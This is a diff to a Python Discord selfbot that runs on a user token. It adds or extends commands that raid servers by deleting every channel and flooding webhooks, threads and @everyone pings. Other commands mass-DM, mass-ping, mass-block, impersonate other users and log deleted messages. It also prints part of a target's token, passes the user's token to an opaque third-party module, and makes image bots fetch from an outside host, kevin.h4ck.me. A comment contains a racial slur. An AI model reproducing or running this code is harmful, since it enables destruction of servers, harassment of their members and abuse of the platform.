@@ -1,24 +1,26 @@
 import os
+from caption import Caption
 import time
 import discord
 from discord.ext import commands, tasks
 import requests
 import random
 from duckduckgo_search import DDGS
-from openai import AsyncOpenAI
 from bs4 import BeautifulSoup
 import urllib.parse
+from urllib.parse import quote
 from selenium import webdriver
 import json
 import base64
 import asyncio
 from tls_client import Session
 from discord import SyncWebhook
-import secrets
+import secrets 
 import string
-import io
+import io 
 import contextlib
 import subprocess
+import kevincord
 from art import *
 config = open('config.json')
 data = json.load(config)
@@ -29,6 +31,16 @@ webhook_id = data["webhook_id"]
 prefix = f"{bot_prefix}"
 bot = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None)
 token = f"{bot_token}"
+wrapper = kevincord.Bot()
+global wrp 
+wrp = False 
+if wrapper.run(token) and wrapper.on_ready:
+    wrp = True 
+check = kevincord.Check()
+global chk 
+chk = False 
+if check.run(token) and check.check():
+    chk = True 
 
 #=========|
 #         |
@@ -37,31 +49,98 @@ token = f"{bot_token}"
 #         /
 #=      a u r _ r a
 
-async def checkperms(guild):  #c h e c k   p e r m s
-    guild_id = guild.id
+@bot.command()
+async def reactall(ctx, *, emoji: str):
+    if wrp is True:
+        emoji = emoji 
+        emoji = wrapper.convemoji(emoji)
+        if emoji is not None:
+            chid = ctx.channel.id
+            async for message in ctx.channel.history(limit=None):
+                msgid = message.id 
+                wrapper.react(chid, msgid, emoji)
+
+
+@bot.command()
+async def purgeexcept(ctx, arg: str):
+    async for message in ctx.channel.history(limit=None):
+        if message.author.id == bot.user.id:
+            if arg not in message.content:
+                await message.delete()
+
+async def blck(member):
+    member = member
+    url=f"https://discord.com/api/v9/users/@me/relationships/{member}"
+    headers = {
+        "Authorization": token, 
+        "Content-Type": "application/json",
+        }
+    payload = {
+        "type": 2
+        }
+    res = requests.post(url, headers=headers)
+    if res.status_code == 204:
+        return True 
+    else:
+        raise Exception(f"{res.text}")
+        return False
+
+
+@bot.command()
+async def blockall(ctx):
+    for member in ctx.guild.members:
+        try:
+            if member.id != bot.user.id:
+                if await blck(member.id):
+                    await ctx.send(f"`Unblocked <@{member.id}>`")
+        except Exception as e:
+            await ctx.send(f"`Exception: {e}`")
+
+@bot.command()
+async def closedm(ctx):
+    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}?silent=false"
+    headers = {
+        "Authorization": token, 
+        "Content-Type": "application/json",
+        }
+    res = requests.delete(url, headers=headers)
+    if res.status_code != 200: 
+        await ctx.send(f"`Exception: {res.text}`")
+    else:
+        pass
+
+async def checkperms(guild):  #c h e c k   p e r m s 
+    guild_id = guild.id 
     url = f"https://discord.com/api/v9/guilds/{guild_id}/widget"
     headers = {
         "Authorization": token,
         }
     res = requests.get(url, headers=headers)
-    code = res.status_code
-    match code:
+    code = res.status_code 
+    match code: 
         case 200:
-            perms = True
-            return perms
+            perms = True 
+            return perms 
         case 403:
-            perms = False
-            return perms
+            perms = False 
+            return perms 
         case _:
             perms = f"Unknown return code from server {code}"
 
 
 async def notsobotfunc(guild):
-    notsobotid = 439205512425504771
+    notsobotid: int = 439205512425504771
     for member in guild.members:
         if member.id == notsobotid:
-            notsobot = True
+            notsobot = True 
             return notsobot
+
+async def assystfunc(guild):
+    assystid: int = 571661221854707713
+    for member in guild.members:
+        if member.id == assystid:
+            assyst = True 
+            return assyst 
 
 async def threadcheck(ctx):
     channel_id = ctx.channel.id
@@ -83,60 +162,68 @@ async def threadcheck(ctx):
         threadid = resjson["id"]
         url = f"https://discord.com/api/v9/channels/{threadid}"
         requests.delete(url, headers=headers)
-        threadbool = True
+        threadbool = True 
         return threadbool
     else:
-        threadbool = False
+        threadbool = False 
         return threadbool
 
 async def webhookcheck(ctx):
     url = "https://discord.com/api/v9/channels/{ctx.channel.id}/webhooks"
     headers = {
-        "Authorization": token,
+        "Authorization": token, 
         "Content-Type": "application/json",
         }
     payload = {
         "name": "test"
         }
     res = requests.post(url, headers=headers, json=payload)
-    status = res.status_code
-    match status:
+    status = res.status_code 
+    match status: 
         case 200:
-            webhookbool = True
+            webhookbool = True 
             return webhookbool
-        case _:
-            webhookbool = False
+        case _: 
+            webhookbool = False 
             return webhookbool
 async def checkimg(ctx):
     try:
         message = await ctx.send(file=discord.File('test.jpg'))
         await message.delete()
-        imgbool = True
+        imgbool = True 
         return imgbool
     except discord.Forbidden:
-        imgbool = False
+        imgbool = False 
         return imgbool
 
 
-@bot.command() #new command lets you check for vulns in the server
+@bot.command() #new command lets you check for vulns in the server 
 async def vuln(ctx):
     guild = ctx.guild
     notsobot = await notsobotfunc(guild)
     if notsobot is None:
-        notsobot = False
+        notsobot = False 
     perms = await checkperms(guild)
     threadbool = await threadcheck(ctx)
     webhookbool = await webhookcheck(ctx)
     imgbool = await checkimg(ctx)
+    assyst = await assystfunc(guild)
+    if assyst is None:
+        assyst = False
     vulns = [notsobot, perms, threadbool, webhookbool, imgbool] #this is for later lol idek
-    await ctx.send(f"`Results\nNotsobot: {notsobot}\nPerms: {perms}\nThreads: {threadbool}\nImage: {imgbool}\nWebhook: {webhookbool}\n`")
-    if notsobot is True and imgbool is False:
-        message = await ctx.send(".resize https://kevin.h4ck.me/test.jpg")
-        await message.delete()
+    await ctx.send(f"`Results\nNotsobot: {notsobot}\nAssyst: {assyst}\nPerms: {perms}\nThreads: {threadbool}\nImage: {imgbool}\nWebhook: {webhookbool}\n`")
+    if assyst == True and imgbool == False:
+        msg = await ctx.send("-resize https://kevin.h4ck.me/test.jpg")
+        await msg.delete()
+    if notsobot == True and imgbool == False:
+        msg = await ctx.send(".resize https://kevin.h4ck.me/test.jpg")
+        await msg.delete()
+
+        
 
 
 async def thread(ctx, name):
-    channel_id = ctx.channel.id
+    channel_id = ctx.channel.id 
     url = f"https://discord.com/api/v9/channels/{channel_id}/threads"
     headers = {
         "Content-Type": "application/json",
@@ -150,6 +237,7 @@ async def thread(ctx, name):
         }
     while True:
         req = requests.post(url, headers=headers, json=payload)
+        await asyncio.sleep(0.5)
         if req.status_code != 201:
             await ctx.send(f"`Exception: {req.text}`")
             break
@@ -160,11 +248,10 @@ async def thread(ctx, name):
         '''
 @bot.command()
 async def threadspam(ctx, *, name):
-    name = name
+    name = name 
     await asyncio.gather(thread(ctx, name))
-
 async def webhookspam(ctx):
-    channel_id = await update(ctx.guild)
+    channel_id = await update(ctx.guild) 
     name = "GIH"
     message = "@everyone"
     url = f'https://discord.com/api/v9/channels/{channel_id}/webhooks'
@@ -192,24 +279,27 @@ async def webhookspam(ctx):
 async def deletechan(guild):
     channel_ids = [channel.id for channel in guild.channels]
     for channel_id in channel_ids:
-        channel = bot.get_channel(channel_id)
-        await channel.delete()
+        try:
+            channel = bot.get_channel(channel_id)
+            await channel.delete()
+        except Exception as e:
+            pass
 
 async def update(guild):
     channel_name = "raided-by-gih"
     channel = await guild.create_text_channel(channel_name)
     channel_id = channel.id
     return channel_id
-
+        
 @bot.command()
 async def raid(ctx):
     await asyncio.gather(deletechan(ctx.guild))
     name = "raided by gih"
     await asyncio.gather(update(ctx.guild), webhookspam(ctx), thread(ctx, name))
-
+    
 @bot.command()
 async def rainbowstop(ctx):
-    global rainbow
+    global rainbow 
     rainbow = False
     await ctx.send(f"`Stopped the rainbow`")
 
@@ -222,8 +312,8 @@ async def rainbow(ctx, role_name: str):
         await ctx.send(f'`Role {role_name} not found.`')
 
 async def rainbow_task(guild, role):
-    global rainbow
-    rainbow = True
+    global rainbow 
+    rainbow = True 
     while rainbow:
         colors = [discord.Color.red(), discord.Color.orange(), discord.Color.gold(), discord.Color.green(),
               discord.Color.blue(), discord.Color.purple()]
@@ -250,7 +340,7 @@ async def theme(ctx, *, theme: str):
             }
     elif theme == "light":
         payload = {
-            "settings":"agYIAhABGgA="
+            "settings":"agYIAhABGgA="    
             }
     else:
         await ctx.send(f"`Exception: invalid theme {theme}`")
@@ -268,7 +358,7 @@ async def session(ctx):
         'X-Super-Properties': 'eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkZpcmVmb3giLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEyMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIzLjAiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI2NDEwOSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
         }
     res = requests.get(url, headers=headers)
-    response = res.json()
+    response = res.json() 
     parsed = json.dumps(response)
     data = json.loads(parsed)
     user_os = data["user_sessions"][0]["client_info"]["os"]
@@ -277,41 +367,16 @@ async def session(ctx):
     user_lastlog = data["user_sessions"][0]["approx_last_used_time"]
     await ctx.send(f"`Session info\nOS: {user_os}\nPlatform: {user_platform}\nLocation: {user_location}\nLast login: {user_lastlog}`")
 
-@bot.command() #couldve used case here but im too lazy to change this now, and besides it works just fine lol
+@bot.command() #couldve used case here but im too lazy to change this now, and besides it works just fine lol 
 async def hypesquad(ctx, *, house: str):
-    url = "https://discord.com/api/v9/hypesquad/online"
-    headers = {
-        'Authorization': token,
-        }
-    if house == "bravery":
-        payload = {
-            "house_id":"1"
-            }
-    elif house == "brilliance":
-        payload = {
-            "house_id":"2"
-            }
-    elif house == "balance":
-        payload = {
-            "house_id":"3"
-            }
-    elif house == "none":
-        res = requests.delete(url, headers=headers)
-        if res.status_code == 204:
-            await ctx.send(f"`Left hypesquad`")
-            return
-        else:
-            await ctx.send(f"`Exception: {res.text}`")
-            return
+    houses = ["brilliance", "bravery", "balance", "none"]
+    if house in houses:
+        if wrapper.hypesquad(house):
+            await ctx.send(f"`Changed house to {house}`")
     else:
-        await ctx.send(f"`Exception: invalid house name {house}`")
-    res = requests.post(url, headers=headers, json=payload)
-    if res.status_code == 204:
-        await ctx.send(f"`Changed badge to {house}`")
-    else:
-        await ctx.send(f"`Exception: {res.text}`")
+        await ctx.send(f"`Exception invalid house name: {house}`")
 
-@bot.command() #idk i wanted to make a strap command that will do all the things at once so this func was a part of that but now its a command lol
+@bot.command() #idk i wanted to make a strap command that will do all the things at once so this func was a part of that but now its a command lol 
 async def dev(ctx):
     url = "https://discord.com/api/v9/users/@me/settings-proto/1"
     headers = {
@@ -334,10 +399,10 @@ async def impersonate(ctx, usrid: int):
     display = json_data["global_name"]
     url = f"https://discord.com/api/v9/users/{usrid}/profile"
     headers = {
-        'Authorization': token,
+        'Authorization': token, 
         }
     res = requests.get(url, headers=headers)
-    response = res.text
+    response = res.text 
     parsed = json.loads(response)
     user_bio = parsed["user"]["bio"]
     user_avatar = parsed["user"]["avatar"]
@@ -432,7 +497,7 @@ async def impersonate(ctx, usrid: int):
         r =sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
         if r.status_code != 200:
             print(r.text)
-
+    
 @bot.command()
 async def filter(ctx, *, keyword):
     async for msg in ctx.channel.history(limit=50):
@@ -480,7 +545,7 @@ async def reply(ctx, member: discord.Member, *, content):
             if message.author.id == member.id:
                 if "http" in message.content:
                     msg = f"<{message.content}>"
-                else:
+                else: 
                     msg = f"{message.content}"
                 await ctx.send(f"`Reply to`{message.author.mention}\n> {msg}\n{content}")
                 break
@@ -489,12 +554,12 @@ async def reply(ctx, member: discord.Member, *, content):
     except Exception as e:
         await ctx.send(f"`Exception: {e}`")
 
-@bot.command() #rate limit here is huge lmao so you can basically change your nick randomly a few times then you get rate limited
+@bot.command() #rate limit here is huge lmao so you can basically change your nick randomly a few times then you get rate limited 
 async def randnick(ctx):
     while True:
         url = "https://random-word-api.vercel.app/api?words=1"
         res = requests.get(url)
-        response = res.text
+        response = res.text 
         rand_word = json.loads(response)[0]
         url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/@me"
         headers = {
@@ -556,7 +621,7 @@ async def webhook(ctx, name: str, *, message):
         webhook = SyncWebhook.from_url(f"{url}")
         while True:
             webhook.send(f"{message}")
-    elif res.status_code == 403:
+    elif res.status_code == 403: 
         await ctx.send("`Missing permission!`")
     else:
         await ctx.send(f"`Exception: {res.status_code} {res.text}`")
@@ -586,13 +651,13 @@ async def groupname(ctx, *, name):
         "name": f"{name}"
         }
     res = requests.patch(url, headers=headers, json=payload)
-    if res.status_code != 200:
+    if res.status_code != 200: 
         await ctx.send(f"`not ok\n{res.text}`")
 
 @bot.command()
 async def group(ctx, *user_ids):
     user_ids_array = []
-    for user_id in user_ids:
+    for user_id in user_ids:         
         user_id = int(user_id)
         user_ids_array.append(user_id)
     json_payload = {"recipients": user_ids_array}
@@ -613,18 +678,17 @@ async def group(ctx, *user_ids):
 async def clear(ctx):
     try:
         messages = ctx.channel.history(limit=50)
-        async for msg in messages:
+        async for msg in messages: 
             if ctx.author.id == bot.user.id:
                 target = "`"
                 if bot_prefix in msg.content or target in msg.content:
                     await msg.delete()
     except Exception as e:
-        await ctx.send(f"`Exception: {e}`")
-
+        pass
 @bot.command()
 async def invite(ctx):
         try:
-            server_id = ctx.guild.id
+            server_id = ctx.guild.id 
             channel_id = ctx.channel.id
             sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)
             headers = {
@@ -668,13 +732,17 @@ async def invite(ctx):
             await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
-async def massping(ctx):
-    members = ctx.guild.members
-    for member in members:
-        usr_id = member.id
-        if usr_id != bot.user.id:
-            await ctx.send(f"<@{usr_id}>")
-
+async def massping(ctx): 
+    members = ctx.guild.members 
+    with open("mass.txt", "w") as file:
+        for member in members:
+            file.write(f"<@{member.id}>")
+    with open("mass.txt", "r") as file:
+        global spam_flag
+        mass = file.read()
+        spam_flag = True
+        while spam_flag:
+            await ctx.send(mass)
 @bot.command()
 async def unblock(ctx, *, user):
     user=user
@@ -697,11 +765,11 @@ async def unblock(ctx, *, user):
 
 @bot.command()
 async def block(ctx, *, user):
-    user=user
+    user=user 
     try:
         url=f"https://discord.com/api/v9/users/@me/relationships/{user}"
         req = requests.get(f"https://discordlookup.mesavirep.xyz/v1/user/{user}")
-        text = req.text
+        text = req.text 
         json_data = json.loads(text)
         display = json_data["global_name"]
         headers = {
@@ -711,9 +779,9 @@ async def block(ctx, *, user):
                 "type": 2
                 }
         res = requests.put(url, json=payload, headers=headers)
-        if res.status_code == 204:
+        if res.status_code == 204: 
             await ctx.send(f"`Blocked {display}`")
-        else:
+        else: 
             await ctx.send(f"`Failed blocking {display}\n{res.status_code}`")
     except Exception as e:
         await ctx.send(f"`Exception: {e}`")
@@ -771,13 +839,13 @@ async def serverinfo(ctx, *, icon="noshow"):
     try:
         if icon != "icon":
             await ctx.send(f"`Server info\nServer name: {ctx.guild.name}\nCreated at: {ctx.guild.created_at}\nServer ID: {ctx.guild.id}\nOwner: {ctx.guild.owner.name}`")
-        else:
+        else: 
             await ctx.send(f"{ctx.guild.icon.url}")
     except Exception as e:
         await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
-async def devinfo(ctx, *, security="noshow"):
+async def devinfo(ctx, *, security="noshow"): 
     try:
         if security == "show":
             await ctx.send(f"`Dev info\nUser ID: {bot.user.id}\nWebhook: {webhook_url}\nUsername: {bot.user.name}\nLatency: {bot.latency}ms\nChannel ID: {ctx.channel.id}\nToken: {bot_token}`")
@@ -790,13 +858,13 @@ async def devinfo(ctx, *, security="noshow"):
 @bot.command()
 async def massdm(ctx, *, message: str): #it will complain about niggercaptcha so idc really
     try:
-        members = ctx.guild.members
+        members = ctx.guild.members 
         await ctx.send("`Starting mass dm...`")
         for member in members:
-            usr_id = member.id
+            usr_id = member.id 
             if usr_id == bot.user.id:
                 continue
-            else:
+            else: 
                 user = await bot.fetch_user(f"{usr_id}")
                 await user.send(f"{message}")
                 await ctx.send(f"`Sent message to {member.name}`")
@@ -804,7 +872,7 @@ async def massdm(ctx, *, message: str): #it will complain about niggercaptcha so
     except discord.errors.CaptchaRequired as e:
         await ctx.send(f"`Exception: {e}`")
 
-@bot.command() #func almost stolen from stack overflow lmao
+@bot.command() #func almost stolen from stack overflow lmao 
 #https://stackoverflow.com/questions/63863871/discord-py-how-to-go-through-channel-history-and-search-for-a-specific-message
 async def history(ctx, *, word: str):
     try:
@@ -815,9 +883,9 @@ async def history(ctx, *, word: str):
             if word in msg.content:
                 if msg.author.id != bot.user.id:
                     await ctx.send(f"`{msg.author.name}: {msg.content}` [jump to msg]({msg.jump_url})")
-                else:
+                else: 
                     continue
-    except Exception as e:
+    except Exception as e: 
         await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
@@ -853,7 +921,7 @@ async def scrape(ctx):
                     f.write(f"{message.created_at} {message.author}: {attach}\n")
                 else:
                     f.write(f"{message.created_at} {message.author}: {message.content}\n")
-            except Exception as e:
+            except Exception as e: 
                 await ctx.send(f"`Exception: {e}`")
         await ctx.send("`Finished scraping`")
     except Exception as e:
@@ -865,7 +933,7 @@ async def serverdel(ctx, *, server: int):
     try:
         sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)
         await ctx.send(f"`Deleting server {server}`")
-        server = server
+        server = server 
         headers = {
             'Host': 'discord.com',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
@@ -888,9 +956,9 @@ async def serverdel(ctx, *, server: int):
         r = sesh.post(f"https://discord.com/api/v9/guilds/{server}/delete", headers=headers)
         if r.status_code == 204:
             await ctx.send(f"`Successfully deleted the server!`")
-        else:
+        else: 
             await ctx.send(f"`Failed deleting the server!`")
-            rhead = r.headers
+            rhead = r.headers 
             await ctx.send(f"{rhead}")
     except Exception as e:
         await ctx.send(f"`Exception: {e}`")
@@ -931,7 +999,7 @@ async def server(ctx, *, name):
             "guild_template_code":"2TffvPucqHkN"
             }
         r = sesh.post("https://discord.com/api/v9/guilds", json=payload, headers=headers)
-        rhead = r.json()
+        rhead = r.json() 
         if r.status_code == 201:
             await ctx.send(f"`Successfully created the server!`")
             #await ctx.send(f"`{rhead}`")
@@ -966,11 +1034,11 @@ async def server(ctx, *, name):
                 "max_uses":0,
                 "target_type":None,
                 "temporary":False,
-                "flags":0
+                "flags":0 
                 }
             r = sesh.post(f"https://discord.com/api/v9/channels/{channel_id}/invites", json=payload, headers=headers)
             rhead = r.json()
-            if r.status_code == 200:
+            if r.status_code == 200: 
                 #await ctx.send(f"`{rhead}`")
                 converted = json.dumps(rhead, indent=2)
                 parsed = json.loads(converted)
@@ -978,7 +1046,7 @@ async def server(ctx, *, name):
                 await ctx.send(f"https://discord.gg/{invite}")
             else:
                 await ctx.send("`Failed extracting invite!`")
-        else:
+        else: 
             await ctx.send(f"`Failed making server {name}`")
             await ctx.send(f"`{rhead}`")
     except Exception as e:
@@ -988,7 +1056,7 @@ async def server(ctx, *, name):
 async def leave(ctx):
     try:
         sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)
-        guild_id = ctx.guild.id
+        guild_id = ctx.guild.id 
         name = ctx.guild.name
         await ctx.send(f"`Leaving server {ctx.guild.name}`")
         headers = {
@@ -998,7 +1066,7 @@ async def leave(ctx):
             'Accept-Language': 'en-US,en;q=0.5;',
             'Accept-Encoding': 'gzip, deflate, br',
             'Content-Type': 'application/json',
-            'Authorization': f'{token}',
+            'Authorization': f'{token}', 
             'X-Super-Properties': 'eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkZpcmVmb3giLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjEyMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1OTUwMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
             'X-Discord-Locale': 'en-US',
             'X-Discord-Timezone': 'UTC',
@@ -1015,7 +1083,7 @@ async def leave(ctx):
         payload = {
             "lurking": "false"
             }
-
+    
         r =sesh.delete(f"https://discord.com/api/v9/users/@me/guilds/{ctx.guild.id}", json=payload, headers=headers)
         if r.status_code != 204:
             print(f"Failed leaving the server {name}")
@@ -1034,14 +1102,14 @@ async def purge(ctx):
         await ctx.send(f"`Purging all messages in {channel_id}`")
         async for message in ctx.channel.history(limit=None):
             if message.author == bot.user:
-                message_id = message.id
+                message_id = message.id 
                 url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
                 response = requests.delete(url, headers=headers)
                 time.sleep(1)
         await ctx.send(f"`Finished purging all messages in {channel_id}`", delete_after=5)
     except Exception as e:
         await ctx.send(f"`Exception: {e}`")
-
+            
 async def typing(ctx):
     channel_id = ctx.channel.id
     headers = {
@@ -1102,8 +1170,8 @@ async def on_ready():
     print(f'=' * 35)
     print('Written by kevin')
 
-
-@bot.event #shitty nitro sniper i dont have a feature to auto redeem but soon enough
+ 
+@bot.event #shitty nitro sniper i dont have a feature to auto redeem but soon enough 
 async def on_message(message): #func inspired by github.com/0x1F608/Silly-Selfbot/blob/main/main.py
     if "https://discord.gift/" in message.content:
         if message.author.id != bot.user.id and message.author.id != webhook_id:
@@ -1113,9 +1181,47 @@ async def on_message(message): #func inspired by github.com/0x1F608/Silly-Selfbo
             except Exception as e:
                 webhook = SyncWebhook.from_url(f"{webhook_url}")
                 webhook.send(f'@everyone\n`Nitro sniper\nUser: {message.author.name}\nID: {message.author.id}\n{message.content}`')
+        
+        """
+    if message.guild.id == 1154957419420581959:
+        guild = message.guild 
+        member_ids = [member.id for member in guild.members] 
+    if message.author.id in member_ids:
+        if message.author.id != bot.user.id:
+            caption = f"{message.content}"
+            image = './abdul2.png'
+            outputImage = './image.png'
+            meme = Caption(caption, image)
+            img = meme.draw()
+            if img.mode in ("RGBA", "P"):   #Without this the code can break sometimes
+                img = img.convert("RGB")
+                img.save(outputImage, optimize=True, quality=80)
+                await message.channel.send(file=discord.File("image.png"))
+                os.remove("image.png")
+        else:
+            await bot.process_commands(message)
+        """
+    
     else:
         await bot.process_commands(message)
-
+ 
+@bot.command()
+async def caption(ctx, imgurl: str, *, caption: str):
+    await ctx.message.delete()
+    if imgurl is not None: 
+        r = requests.get(imgurl)
+        with open("caption.png", "wb") as f:
+            f.write(r.content)
+        image = "./caption.png"
+        outputImage = "./caption1.png"
+        meme = Caption(caption, image)
+        img = meme.draw()
+        img = img.convert("RGB")
+        img.save(outputImage, optimize=True, quality=80)
+        await ctx.send(file=discord.File("caption1.png"))
+        os.remove("caption.png") 
+        os.remove("caption1.png") 
+    
 
 @bot.event #event to log deleted messages comment out if you dont want it lol
 async def on_message_delete(message):
@@ -1149,7 +1255,7 @@ async def on_message_delete(message):
                         f.write(res.content)
                     webhook.send(file=discord.File(f"{name}"))
                     os.remove(f"{name}")
-
+                    
 @bot.command()
 async def ping(ctx):
     latency = round(bot.latency * 1000)
@@ -1164,30 +1270,37 @@ async def whois(ctx, member: discord.Member):
         b64 = base64.b64encode(token_bytes)
         b6_string = b64.decode("ascii")
         await ctx.send(f'`Username: {member.name}\nUser ID: {member.id}\nJoined: {member.created_at}\nToken: {b6_string}\n`{member.avatar.url}')
-    except Exception as e:
+    except Exception as e: 
         await ctx.send(f"`An error occurred\n{e}`")
 
 @bot.command()
 async def pfp(ctx, member: discord.Member):
     try:
         await ctx.send(f'{member.avatar.url}')
-    except Exception as e:
-        await ctx.send(f"`An error occurred\n{e}`")
+    except Exception as e: 
+        await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
-async def spam(ctx, *, text):
+async def spam(ctx, arg=None, *, text):
     try:
 
         await ctx.message.delete()
         global spam_flag
         spam_flag = True
-        await ctx.send("`Starting spam...`", delete_after=1)
         while spam_flag:
             random_number = random.randint(1, 10000)
-            message = text +str(random_number)
-            await ctx.send(text) #change to message for possible measure evasion
+            message = f"{text}\n{random_number}"
+            match arg:
+                case "rand":
+                    message = message
+                case "norand":
+                    message = text
+                case _:
+                    await ctx.send(f"`Exception: invalid argument {arg} use rand or norand`")
+                    break
+            await ctx.send(message)
     except Exception as e:
-        await ctx.send(f"`An error occurred\n{e}`")
+        await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
 async def stopspam(ctx):
@@ -1199,9 +1312,9 @@ async def stopspam(ctx):
 @bot.command()
 async def type(ctx, *, status="start"): #kind of broken for now i mean it works but um stop command might or might not work
     try:
-        while True:
+        while True: 
             await typing(ctx)
-    except Exception as e:
+    except Exception as e: 
             await typingdm(ctx)
 
 
@@ -1226,34 +1339,6 @@ async def search(ctx, *, query):
             if title and href:
                 message = f"`Title: {title}`\n<{href}>"
                 await ctx.send(message)
-
-client = AsyncOpenAI(
-    api_key=os.environ.get("OPENAI_API_KEY"), #you need to export this on your system export OPENAI_API_KEY=yourkey
-)
-async def get_chat_response(prompt):
-    try:
-        completion = await client.chat.completions.create(
-            model="gpt-3.5-turbo",
-            messages=[
-                {"role": "system", "content": "You are an AI assistant, very skilled in computer science and science in general. You will speak in a formal tone, and address me as Kevin. Your answers will never go over 1999 characters."}, #this is the role prompt, this decides how the AI will behave chnage this to your liking
-                {"role": "user", "content": prompt}
-            ]
-        )
-        response = completion.choices[0].message.content
-        return response
-    except Exception as e:
-        await ctx.send(f"`An error occurred\n{e}`")
-
-@bot.command()
-async def chatgpt(ctx, *, prompt):
-    await ctx.send(f"`Awaiting response...`")
-    try:
-        response = await get_chat_response(prompt)
-        message = f"`Response\n{response}`"
-        await ctx.send(message)
-    except Exception as e:
-        await ctx.send(f"`An error occurred!\n{e}`") #change this to print if you dont want the error publicly displayed
-
 @bot.command()
 async def image(ctx, *, query):
     num = 2 #change this to number of desired results
@@ -1329,7 +1414,7 @@ async def livegore(ctx, *, query):
 @bot.command()
 async def play(ctx, *, name):
     await ctx.send(f"`Changed RPC to {name}`")
-    await bot.change_presence(activity=discord.Game(name=name))
+    await bot.change_presence(activity=discord.Game(name=name)) 
 
 @bot.command()
 async def stream(ctx, *, name):
@@ -1342,12 +1427,12 @@ async def dnd(ctx):
     try:
         await bot.change_presence(status=discord.Status.dnd)
         await ctx.send("`Changed status to Do Not Disturb`")
-    except Exception as e:
+    except Exception as e: 
         await ctx.send(f"`Exception: {e}`")
 
 @bot.command()
 async def idle(ctx):
-    try:
+    try: 
         await bot.change_presence(status=discord.Status.idle)
         await ctx.send("`Changed status to Idle`")
     except Exception as e:
@@ -1355,7 +1440,7 @@ async def idle(ctx):
 
 @bot.command()
 async def ghost(ctx):
-    try:
+    try: 
         await bot.change_presence(status=discord.Status.invisible)
         await ctx.send("`Changed status to Invisible`")
     except Exception as e:
@@ -1410,7 +1495,7 @@ async def avatar(ctx, *, url):
 @bot.command()
 async def bio(ctx, *, bio):
     sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)
-    bio = bio
+    bio = bio 
     headers = {
         "authority": "discord.com", #headers i definitely didnt steal from plebbit dont fucking touch its barely working
         "method": "PATCH",
@@ -1438,7 +1523,7 @@ async def bio(ctx, *, bio):
     r =sesh.patch("https://discord.com/api/v9/users/@me", json=payload, headers=headers)
     if r.status_code == 200:
         await ctx.send(f"`Successfully changed bio to {bio}`")
-    else:
+    else: 
         await ctx.send(f"`Error: {r.text}`") #error handling or something
 
 @bot.command()
@@ -1480,7 +1565,7 @@ async def banner(ctx, *, color):
 @bot.command()
 async def display(ctx, *, name):
     sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)
-    name = name
+    name = name 
     headers = {
         "authority": "discord.com", #headers i definitely didnt steal from plebbit dont fucking touch its barely working
         "method": "PATCH",
@@ -1511,4 +1596,5 @@ async def display(ctx, *, name):
     else:
         await ctx.send(f"`Error: {r.status_code}`") #error handling or something
 
-bot.run(token, log_handler=None) #remove the coma and log_handler=None to get your shitty log handler back :D
+bot.run(token) #remove the coma and log_handler=None to get your shitty log handler back :D
+
